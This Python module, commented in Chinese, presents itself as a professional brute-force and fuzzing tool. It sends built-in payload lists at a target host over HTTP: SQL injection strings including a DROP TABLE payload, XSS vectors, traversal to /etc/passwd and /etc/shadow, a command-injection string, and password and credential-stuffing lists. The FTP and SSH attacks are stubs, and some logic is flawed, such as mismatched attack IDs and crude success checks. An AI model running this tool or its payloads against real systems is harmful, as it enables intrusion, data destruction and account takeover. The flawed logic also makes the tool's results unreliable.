"""
专业级爆破工具模块
基于20年渗透测试经验的多协议爆破工具
支持智能字典生成、分布式爆破和结果分析
"""

import asyncio
import logging
import hashlib
import time
import random
from typing import Dict, List, Optional, Callable, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import aiohttp

logger = logging.getLogger(__name__)

class AttackType(Enum):
    """攻击类型枚举"""
    BRUTE_FORCE = "brute_force"
    DICTIONARY = "dictionary"
    FUZZING = "fuzzing"
    CREDENTIAL_STUFFING = "credential_stuffing"

class ProtocolType(Enum):
    """协议类型枚举"""
    HTTP = "http"
    HTTPS = "https"
    FTP = "ftp"
    SSH = "ssh"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    REDIS = "redis"
    MONGODB = "mongodb"

@dataclass
class AttackTarget:
    """攻击目标"""
    protocol: ProtocolType
    host: str
    port: int
    path: str = "/"
    parameters: Dict[str, str] = None
    headers: Dict[str, str] = None
    cookies: Dict[str, str] = None
    
    def __post_init__(self):
        if self.parameters is None:
            self.parameters = {}
        if self.headers is None:
            self.headers = {}
        if self.cookies is None:
            self.cookies = {}

@dataclass
class PayloadSet:
    """Payload集合"""
    name: str
    payloads: List[str]
    description: str = ""
    category: str = "general"

@dataclass
class AttackResult:
    """攻击结果"""
    attack_id: str
    target: AttackTarget
    payload: str
    response_code: int
    response_length: int
    response_time: float
    matched_pattern: str = ""
    is_success: bool = False
    evidence: str = ""
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
    
    def to_dict(self) -> Dict:
        """转换为字典格式"""
        return {
            'attack_id': self.attack_id,
            'target': {
                'protocol': self.target.protocol.value,
                'host': self.target.host,
                'port': self.target.port,
                'path': self.target.path,
                'parameters': self.target.parameters,
                'headers': self.target.headers,
                'cookies': self.target.cookies
            },
            'payload': self.payload,
            'response_code': self.response_code,
            'response_length': self.response_length,
            'response_time': self.response_time,
            'matched_pattern': self.matched_pattern,
            'is_success': self.is_success,
            'evidence': self.evidence,
            'timestamp': self.timestamp.isoformat()
        }

class ProfessionalIntruder:
    """专业级爆破工具"""
    
    def __init__(self):
        # 攻击配置
        self.attack_config = {
            'timeout': 10,
            'max_threads': 10,
            'retry_count': 3,
            'delay': 0.1,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Payload集合
        self.payload_sets: Dict[str, PayloadSet] = {}
        self._load_default_payload_sets()
        
        # 攻击结果
        self.attack_results: Dict[str, List[AttackResult]] = {}
        self.current_attack_id: Optional[str] = None
        
        # 回调函数
        self.on_attack_start: Optional[Callable] = None
        self.on_attack_progress: Optional[Callable] = None
        self.on_attack_result: Optional[Callable] = None
        self.on_attack_complete: Optional[Callable] = None
        
        # 线程池
        self.thread_pool = ThreadPoolExecutor(max_workers=self.attack_config['max_threads'])
        
        logger.info("专业级爆破工具初始化完成")
    
    def _load_default_payload_sets(self):
        """加载默认Payload集合"""
        # SQL注入Payload集合
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        self.payload_sets['sql_injection'] = PayloadSet(
            name="SQL注入",
            payloads=sql_payloads,
            description="SQL注入攻击Payload集合",
            category="web"
        )
        
        # XSS Payload集合
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>"
        ]
        self.payload_sets['xss'] = PayloadSet(
            name="XSS攻击",
            payloads=xss_payloads,
            description="跨站脚本攻击Payload集合",
            category="web"
        )
        
        # 路径遍历Payload集合
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        self.payload_sets['path_traversal'] = PayloadSet(
            name="路径遍历",
            payloads=path_payloads,
            description="路径遍历攻击Payload集合",
            category="web"
        )
        
        # 用户名字典
        username_dict = [
            "admin", "administrator", "root", "test", "guest",
            "user", "demo", "admin123", "password", "123456"
        ]
        self.payload_sets['usernames'] = PayloadSet(
            name="用户名字典",
            payloads=username_dict,
            description="常见用户名字典",
            category="auth"
        )
        
        # 密码字典
        password_dict = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "shadow", "master", "666666", "qwerty123"
        ]
        self.payload_sets['passwords'] = PayloadSet(
            name="密码字典",
            payloads=password_dict,
            description="常见密码字典",
            category="auth"
        )
    
    async def start_attack(self, attack_type: AttackType, target: AttackTarget, 
                          payload_set_name: str = None, custom_payloads: List[str] = None) -> str:
        """开始攻击"""
        attack_id = self._generate_attack_id()
        self.current_attack_id = attack_id
        self.attack_results[attack_id] = []
        
        # 获取Payload集合
        if custom_payloads:
            payloads = custom_payloads
        elif payload_set_name and payload_set_name in self.payload_sets:
            payloads = self.payload_sets[payload_set_name].payloads
        else:
            # 使用默认Payload集合
            payloads = self._get_default_payloads_for_attack_type(attack_type)
        
        # 触发攻击开始回调
        if self.on_attack_start:
            self.on_attack_start(attack_id, target, len(payloads))
        
        try:
            # 根据协议类型选择攻击方法
            if target.protocol in [ProtocolType.HTTP, ProtocolType.HTTPS]:
                results = await self._http_attack(target, payloads, attack_id)
            elif target.protocol == ProtocolType.FTP:
                results = await self._ftp_attack(target, payloads, attack_id)
            elif target.protocol == ProtocolType.SSH:
                results = await self._ssh_attack(target, payloads, attack_id)
            else:
                raise ValueError(f"不支持的协议类型: {target.protocol}")
            
            # 存储结果
            self.attack_results[attack_id].extend(results)
            
            # 触发攻击完成回调
            if self.on_attack_complete:
                self.on_attack_complete(attack_id, results)
            
            logger.info(f"攻击完成: {attack_id}, 共执行 {len(results)} 次攻击")
            return attack_id
            
        except Exception as e:
            logger.error(f"攻击失败: {e}")
            raise
    
    async def _http_attack(self, target: AttackTarget, payloads: List[str], attack_id: str) -> List[AttackResult]:
        """HTTP协议攻击"""
        results = []
        total_payloads = len(payloads)
        
        async with aiohttp.ClientSession() as session:
            for i, payload in enumerate(payloads):
                try:
                    # 构造请求参数
                    request_params = self._build_http_request(target, payload)
                    
                    # 发送请求
                    start_time = time.time()
                    
                    if target.protocol == ProtocolType.HTTP:
                        url = f"http://{target.host}:{target.port}{target.path}"
                    else:
                        url = f"https://{target.host}:{target.port}{target.path}"
                    
                    async with session.request(
                        method=request_params['method'],
                        url=url,
                        params=request_params.get('params'),
                        data=request_params.get('data'),
                        headers=request_params['headers'],
                        cookies=request_params.get('cookies'),
                        timeout=aiohttp.ClientTimeout(total=self.attack_config['timeout'])
                    ) as response:
                        response_time = time.time() - start_time
                        
                        # 分析响应
                        response_body = await response.read()
                        response_length = len(response_body)
                        
                        # 创建攻击结果
                        result = AttackResult(
                            attack_id=attack_id,
                            target=target,
                            payload=payload,
                            response_code=response.status,
                            response_length=response_length,
                            response_time=response_time,
                            is_success=self._analyze_http_response(response.status, response_body, payload),
                            evidence=self._get_evidence_from_response(response.status, response_body)
                        )
                        
                        results.append(result)
                        
                        # 触发攻击结果回调
                        if self.on_attack_result:
                            self.on_attack_result(result)
                        
                        # 触发进度回调
                        if self.on_attack_progress:
                            progress = (i + 1) / total_payloads * 100
                            self.on_attack_progress(attack_id, progress, i + 1, total_payloads)
                        
                        # 延迟控制
                        await asyncio.sleep(self.attack_config['delay'])
                        
                except Exception as e:
                    logger.warning(f"HTTP攻击失败: {e}")
                    # 创建失败结果
                    result = AttackResult(
                        attack_id=attack_id,
                        target=target,
                        payload=payload,
                        response_code=0,
                        response_length=0,
                        response_time=0,
                        is_success=False,
                        evidence=f"攻击失败: {str(e)}"
                    )
                    results.append(result)
        
        return results
    
    async def _ftp_attack(self, target: AttackTarget, payloads: List[str], attack_id: str) -> List[AttackResult]:
        """FTP协议攻击"""
        # FTP攻击实现
        # 这里需要实现FTP协议的爆破逻辑
        # 由于FTP协议的特殊性，可能需要使用同步库
        results = []
        
        # 占位实现
        for payload in payloads:
            result = AttackResult(
                attack_id=attack_id,
                target=target,
                payload=payload,
                response_code=0,
                response_length=0,
                response_time=0,
                is_success=False,
                evidence="FTP攻击功能待实现"
            )
            results.append(result)
        
        return results
    
    async def _ssh_attack(self, target: AttackTarget, payloads: List[str], attack_id: str) -> List[AttackResult]:
        """SSH协议攻击"""
        # SSH攻击实现
        # 这里需要实现SSH协议的爆破逻辑
        # 由于SSH协议的特殊性，可能需要使用同步库
        results = []
        
        # 占位实现
        for payload in payloads:
            result = AttackResult(
                attack_id=attack_id,
                target=target,
                payload=payload,
                response_code=0,
                response_length=0,
                response_time=0,
                is_success=False,
                evidence="SSH攻击功能待实现"
            )
            results.append(result)
        
        return results
    
    def _build_http_request(self, target: AttackTarget, payload: str) -> Dict[str, Any]:
        """构建HTTP请求参数"""
        request_params = {
            'method': 'GET',
            'headers': target.headers.copy() if target.headers else {},
            'cookies': target.cookies.copy() if target.cookies else {}
        }
        
        # 设置User-Agent
        if 'User-Agent' not in request_params['headers']:
            request_params['headers']['User-Agent'] = self.attack_config['user_agent']
        
        # 处理参数
        if target.parameters:
            # 将Payload注入到第一个参数中
            param_name = list(target.parameters.keys())[0]
            modified_params = target.parameters.copy()
            modified_params[param_name] = payload
            
            request_params['params'] = modified_params
        else:
            # 如果没有参数，将Payload作为查询参数
            request_params['params'] = {'payload': payload}
        
        return request_params
    
    def _analyze_http_response(self, status_code: int, response_body: bytes, payload: str) -> bool:
        """分析HTTP响应"""
        # 根据状态码判断
        if status_code == 200:
            # 分析响应内容
            response_text = response_body.decode('utf-8', errors='ignore').lower()
            
            # 检查是否包含错误信息
            error_indicators = [
                'error', 'exception', 'warning', 'invalid', 'failed',
                'sql', 'mysql', 'oracle', 'database', 'syntax'
            ]
            
            # 如果包含错误信息，可能是攻击成功
            for indicator in error_indicators:
                if indicator in response_text:
                    return True
            
            # 检查响应长度变化
            # 这里可以实现更复杂的逻辑
            
        elif status_code in [301, 302, 303]:
            # 重定向可能表示成功
            return True
        
        return False
    
    def _get_evidence_from_response(self, status_code: int, response_body: bytes) -> str:
        """从响应中提取证据"""
        evidence_parts = []
        
        # 状态码证据
        evidence_parts.append(f"状态码: {status_code}")
        
        # 响应长度证据
        evidence_parts.append(f"响应长度: {len(response_body)} 字节")
        
        # 响应内容证据（前100字符）
        response_preview = response_body[:100].decode('utf-8', errors='ignore')
        if response_preview:
            evidence_parts.append(f"响应预览: {response_preview}")
        
        return " | ".join(evidence_parts)
    
    def _get_default_payloads_for_attack_type(self, attack_type: AttackType) -> List[str]:
        """根据攻击类型获取默认Payload集合"""
        if attack_type == AttackType.BRUTE_FORCE:
            return self.payload_sets['passwords'].payloads
        elif attack_type == AttackType.DICTIONARY:
            return self.payload_sets['sql_injection'].payloads
        elif attack_type == AttackType.FUZZING:
            # 模糊测试Payload
            return [
                "../../../../etc/passwd",
                "<script>alert('test')</script>",
                "' OR '1'='1",
                "; ls -la",
                "${7*7}"
            ]
        elif attack_type == AttackType.CREDENTIAL_STUFFING:
            # 凭证填充Payload
            return [
                "admin:admin",
                "admin:123456",
                "root:root",
                "test:test"
            ]
        else:
            return ["test"]
    
    def _generate_attack_id(self) -> str:
        """生成攻击ID"""
        return f"attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{hash(datetime.now())}"
    
    # ========== 智能字典生成方法 ==========
    
    def generate_smart_dictionary(self, base_words: List[str], patterns: List[str] = None) -> List[str]:
        """生成智能字典"""
        if patterns is None:
            patterns = [
                "{word}", "{word}123", "{word}!", "{word}@", "{word}#",
                "{word}1", "{word}12", "{word}1234", "{word}2024",
                "{word}_{word}", "{word}.", "{word}-", "{word}+"
            ]
        
        dictionary = []
        
        for word in base_words:
            for pattern in patterns:
                generated_word = pattern.replace("{word}", word)
                dictionary.append(generated_word)
        
        # 去重
        dictionary = list(set(dictionary))
        
        return dictionary
    
    def generate_target_based_dictionary(self, target: AttackTarget) -> List[str]:
        """生成基于目标的字典"""
        dictionary = []
        
        # 基于主机名生成字典
        host_parts = target.host.split('.')
        for part in host_parts:
            if part not in ['www', 'com', 'cn', 'net', 'org']:
                dictionary.extend(self.generate_smart_dictionary([part]))
        
        # 基于路径生成字典
        path_parts = target.path.split('/')
        for part in path_parts:
            if part and part not in ['', 'index', 'home', 'main']:
                dictionary.extend(self.generate_smart_dictionary([part]))
        
        return dictionary
    
    # ========== 结果分析方法 ==========
    
    def analyze_attack_results(self, attack_id: str) -> Dict[str, Any]:
        """分析攻击结果"""
        if attack_id not in self.attack_results:
            return {}
        
        results = self.attack_results[attack_id]
        
        analysis = {
            'total_attacks': len(results),
            'successful_attacks': len([r for r in results if r.is_success]),
            'average_response_time': 0,
            'success_rate': 0,
            'top_payloads': [],
            'response_codes': {},
            'timeline': []
        }
        
        if results:
            # 计算平均响应时间
            total_time = sum(r.response_time for r in results if r.response_time > 0)
            analysis['average_response_time'] = total_time / len(results)
            
            # 计算成功率
            analysis['success_rate'] = analysis['successful_attacks'] / analysis['total_attacks'] * 100
            
            # 统计响应码
            for result in results:
                code = result.response_code
                analysis['response_codes'][code] = analysis['response_codes'].get(code, 0) + 1
            
            # 获取最成功的Payload
            success_payloads = {}
            for result in results:
                if result.is_success:
                    success_payloads[result.payload] = success_payloads.get(result.payload, 0) + 1
            
            analysis['top_payloads'] = sorted(success_payloads.items(), key=lambda x: x[1], reverse=True)[:10]
            
            # 生成时间线
            for result in results:
                analysis['timeline'].append({
                    'timestamp': result.timestamp.isoformat(),
                    'payload': result.payload,
                    'success': result.is_success,
                    'response_time': result.response_time
                })
        
        return analysis
    
    def export_results(self, attack_id: str, format: str = "json") -> str:
        """导出攻击结果"""
        if attack_id not in self.attack_results:
            return ""
        
        results = self.attack_results[attack_id]
        
        if format == "json":
            import json
            return json.dumps([r.to_dict() for r in results], indent=2, ensure_ascii=False)
        
        elif format == "csv":
            import csv
            import io
            
            output = io.StringIO()
            writer = csv.writer(output)
            
            # 写入表头
            writer.writerow(["时间", "Payload", "响应码", "响应长度", "响应时间", "是否成功", "证据"])
            
            # 写入数据
            for result in results:
                writer.writerow([
                    result.timestamp.isoformat(),
                    result.payload,
                    result.response_code,
                    result.response_length,
                    result.response_time,
                    result.is_success,
                    result.evidence
                ])
            
            return output.getvalue()
        
        else:
            raise ValueError(f"不支持的导出格式: {format}")
    
    # ========== 公共方法 ==========
    
    def register_payload_set(self, payload_set: PayloadSet):
        """注册Payload集合"""
        self.payload_sets[payload_set.name] = payload_set
        logger.info(f"注册Payload集合: {payload_set.name}")
    
    def unregister_payload_set(self, payload_set_name: str):
        """注销Payload集合"""
        if payload_set_name in self.payload_sets:
            del self.payload_sets[payload_set_name]
            logger.info(f"注销Payload集合: {payload_set_name}")
    
    def get_payload_set(self, payload_set_name: str) -> Optional[PayloadSet]:
        """获取Payload集合"""
        return self.payload_sets.get(payload_set_name)
    
    def get_all_payload_sets(self) -> Dict[str, PayloadSet]:
        """获取所有Payload集合"""
        return self.payload_sets.copy()
    
    def set_attack_config(self, config: Dict[str, Any]):
        """设置攻击配置"""
        self.attack_config.update(config)
        
        # 更新线程池
        if 'max_threads' in config:
            self.thread_pool.shutdown(wait=True)
            self.thread_pool = ThreadPoolExecutor(max_workers=config['max_threads'])
        
        logger.info("攻击配置已更新")
    
    def get_attack_result(self, attack_id: str) -> Optional[List[AttackResult]]:
        """获取攻击结果"""
        return self.attack_results.get(attack_id)
    
    def get_all_attack_results(self) -> Dict[str, List[AttackResult]]:
        """获取所有攻击结果"""
        return self.attack_results.copy()
    
    def clear_attack_results(self):
        """清空攻击结果"""
        self.attack_results.clear()
        logger.info("攻击结果已清空")
    
    def set_attack_start_callback(self, callback: Callable):
        """设置攻击开始回调"""
        self.on_attack_start = callback
    
    def set_attack_progress_callback(self, callback: Callable):
        """设置攻击进度回调"""
        self.on_attack_progress = callback
    
    def set_attack_result_callback(self, callback: Callable):
        """设置攻击结果回调"""
        self.on_attack_result = callback
    
    def set_attack_complete_callback(self, callback: Callable):
        """设置攻击完成回调"""
        self.on_attack_complete = callback

# 攻击管理器
class AttackManager:
    """攻击管理器"""
    
    def __init__(self):
        self.intruders: Dict[str, ProfessionalIntruder] = {}
        self.active_attacks: Dict[str, asyncio.Task] = {}
    
    def create_intruder(self, intruder_id: str) -> ProfessionalIntruder:
        """创建爆破工具实例"""
        intruder = ProfessionalIntruder()
        self.intruders[intruder_id] = intruder
        return intruder
    
    async def start_attack(self, intruder_id: str, attack_type: AttackType, 
                          target: AttackTarget, payload_set_name: str = None) -> str:
        """启动攻击"""
        if intruder_id not in self.intruders:
            raise ValueError(f"爆破工具不存在: {intruder_id}")
        
        intruder = self.intruders[intruder_id]
        
        # 创建攻击任务
        attack_task = asyncio.create_task(
            intruder.start_attack(attack_type, target, payload_set_name)
        )
        
        # 生成攻击ID
        attack_id = intruder._generate_attack_id()
        self.active_attacks[attack_id] = attack_task
        
        return attack_id
    
    async def stop_attack(self, attack_id: str):
        """停止攻击"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id].cancel()
            del self.active_attacks[attack_id]
    
    def get_intruder(self, intruder_id: str) -> Optional[ProfessionalIntruder]:
        """获取爆破工具"""
        return self.intruders.get(intruder_id)
    
    def get_all_intruders(self) -> Dict[str, ProfessionalIntruder]:
        """获取所有爆破工具"""
        return self.intruders.copy()